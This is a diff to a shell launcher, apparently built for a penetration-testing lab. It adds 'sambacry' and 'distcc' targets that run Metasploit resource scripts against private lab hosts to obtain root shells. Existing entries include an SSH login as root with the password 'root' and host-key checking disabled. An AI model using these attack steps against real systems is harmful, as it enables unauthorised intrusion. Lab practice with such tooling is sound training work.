@@ -24,11 +24,26 @@ case "$1" in
         echo ""
         sshpass -p 'root' ssh -o StrictHostKeyChecking=no root@172.20.0.17
         ;;
+    samba|sambacry)
+        echo "[*] Pwning SambaCry CVE-2017-7494 (172.20.0.16)..."
+        echo "[*] You'll get a Meterpreter session - type 'getuid' to confirm root"
+        echo "[*] Drop to shell with: shell"
+        echo ""
+        msfconsole -q -r "$SCRIPTS_DIR/pwn-sambacry.rc"
+        ;;
+    distcc|metasploitable2)
+        echo "[*] Pwning DistCC on Metasploitable2 (172.20.0.20)..."
+        echo "[*] You'll get a shell - type 'id' to confirm access"
+        echo ""
+        msfconsole -q -r "$SCRIPTS_DIR/pwn-distcc.rc"
+        ;;
     list|--list|-l)
         echo "Available targets:"
-        echo "  tomcat  - Tomcat Manager upload (172.20.0.19)"
-        echo "  vsftpd  - vsftpd 2.3.4 backdoor (172.20.0.15)"
-        echo "  ssh     - SSH weak password (172.20.0.17)"
+        echo "  tomcat    - Tomcat Manager upload (172.20.0.19)"
+        echo "  vsftpd    - vsftpd 2.3.4 backdoor (172.20.0.15)"
+        echo "  ssh       - SSH weak password (172.20.0.17)"
+        echo "  sambacry  - SambaCry RCE (172.20.0.16)"
+        echo "  distcc    - DistCC RCE on Metasploitable2 (172.20.0.20)"
         echo ""
         echo "Usage: pwn <target>"
         ;;
